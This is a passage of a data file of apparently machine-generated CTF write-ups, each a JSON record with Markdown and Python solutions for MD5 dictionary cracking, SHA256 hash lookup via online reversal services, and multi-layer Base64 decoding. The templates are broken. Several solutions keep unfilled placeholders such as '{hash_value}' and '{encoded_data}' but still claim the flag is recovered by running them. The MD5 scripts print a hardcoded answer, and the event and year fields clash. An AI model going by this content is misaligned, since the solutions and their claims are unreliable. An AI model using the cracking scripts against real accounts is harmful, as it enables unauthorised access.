password123\")\n        print(f\"Flag: flag{password123}\")\n        break\n\n```\n\n## Tools Used\n- hashlib\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"482c811da5d5b4bc6d497ffa98491e38\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: password123\")\n        print(f\"Flag: flag{password123}\")\n        break\n", "url": "https://synthetic-ctf.example.com/hash/90", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835885", "synthetic": true}
{"id": "synthetic_hash_091", "team": "synthetic_team_5", "event": "CTF_2024_Event_3", "challenge_name": "MD5 Dictionary Attack #92", "challenge_description": "Crack MD5 hash using dictionary attack", "attack_type": "Hash", "tools_used": ["hashlib"], "difficulty": "easy", "writeup": "# MD5 Dictionary Attack\n\n## Challenge Description\nCrack MD5 hash using dictionary attack\n\n## Analysis\nThis challenge involves md5 dictionary attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"482c811da5d5b4bc6d497ffa98491e38\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: password123\")\n        print(f\"Flag: flag{password123}\")\n        break\n\n```\n\n## Tools Used\n- hashlib\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"482c811da5d5b4bc6d497ffa98491e38\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: password123\")\n        print(f\"Flag: flag{password123}\")\n        break\n", "url": "https://synthetic-ctf.example.com/hash/91", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835902", "synthetic": true}
{"id": "synthetic_hash_092", "team": "synthetic_team_3", "event": "CTF_2024_Event_2", "challenge_name": "SHA256 Rainbow Table #93", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/92", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836171", "synthetic": true}
{"id": "synthetic_hash_093", "team": "synthetic_team_6", "event": "CTF_2024_Event_13", "challenge_name": "MD5 Dictionary Attack #94", "challenge_description": "Crack MD5 hash using dictionary attack", "attack_type": "Hash", "tools_used": ["hashlib"], "difficulty": "easy", "writeup": "# MD5 Dictionary Attack\n\n## Challenge Description\nCrack MD5 hash using dictionary attack\n\n## Analysis\nThis challenge involves md5 dictionary attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"21232f297a57a5a743894a0e4a801fc3\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: admin\")\n        print(f\"Flag: flag{admin}\")\n        break\n\n```\n\n## Tools Used\n- hashlib\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"21232f297a57a5a743894a0e4a801fc3\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: admin\")\n        print(f\"Flag: flag{admin}\")\n        break\n", "url": "https://synthetic-ctf.example.com/hash/93", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836204", "synthetic": true}
{"id": "synthetic_hash_094", "team": "synthetic_team_7", "event": "CTF_2024_Event_6", "challenge_name": "MD5 Dictionary Attack #95", "challenge_description": "Crack MD5 hash using dictionary attack", "attack_type": "Hash", "tools_used": ["hashlib"], "difficulty": "easy", "writeup": "# MD5 Dictionary Attack\n\n## Challenge Description\nCrack MD5 hash using dictionary attack\n\n## Analysis\nThis challenge involves md5 dictionary attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"5ebe2294ecd0e0f08eab7690d2a6ee69\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: secret\")\n        print(f\"Flag: flag{secret}\")\n        break\n\n```\n\n## Tools Used\n- hashlib\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"5ebe2294ecd0e0f08eab7690d2a6ee69\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: secret\")\n        print(f\"Flag: flag{secret}\")\n        break\n", "url": "https://synthetic-ctf.example.com/hash/94", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836223", "synthetic": true}
{"id": "synthetic_hash_095", "team": "synthetic_team_3", "event": "CTF_2024_Event_6", "challenge_name": "SHA256 Rainbow Table #96", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/95", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836240", "synthetic": true}
{"id": "synthetic_encoding_000", "team": "synthetic_team_4", "event": "CTF_2024_Event_9", "challenge_name": "Base64 Multi-layer #1", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/0", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836285", "synthetic": true}
{"id": "synthetic_encoding_001", "team": "synthetic_team_8", "event": "CTF_2024_Event_5", "challenge_name": "Base64 Multi-layer #2", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/1", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836301", "synthetic": true}
{"id": "synthetic_encoding_002", "team": "synthetic_team_10", "event": "CTF_2024_Event_14", "challenge_name": "Base64 Multi-layer #3", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/2", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836314", "synthetic": true}
{"id": "synthetic_encoding_003", "team": "synthetic_team_9", "event": "CTF_2024_Event_6", "challenge_name": "Base64 Multi-layer #4", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/3", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836328", "synthetic": true}
{"id": "synthetic_encoding_004", "team": "synthetic_team_7", "event": "CTF_2024_Event_12", "challenge_name": "Base64 Multi-layer #5", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/4", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836342", "synthetic": true}
{"id": "synthetic_encoding_005", "team": "synthetic_team_7", "event": "CTF_2024_Event_13", "challenge_name": "Base64 Multi-layer #6", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/5", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836355", "synthetic": true}
{"id": "synthetic_encoding_006", "team": "synthetic_team_2", "event": "CTF_2024_Event_11", "challenge_name": "Base64 Multi-layer #7", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/6", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836368", "synthetic": true}
{"id": "synthetic_encoding_007", "team": "synthetic_team_10", "event": "CTF_2024_Event_9", "challenge_name": "Base64 Multi-layer #8", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/7", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836382", "synthetic": true}
{"id": "synthetic_encoding_008", "team": "synthetic_team_6", "event": "CTF_2024_Event_18", "challenge_name": "Base64 Multi-layer #9", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/8", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836394", "synthetic": true}
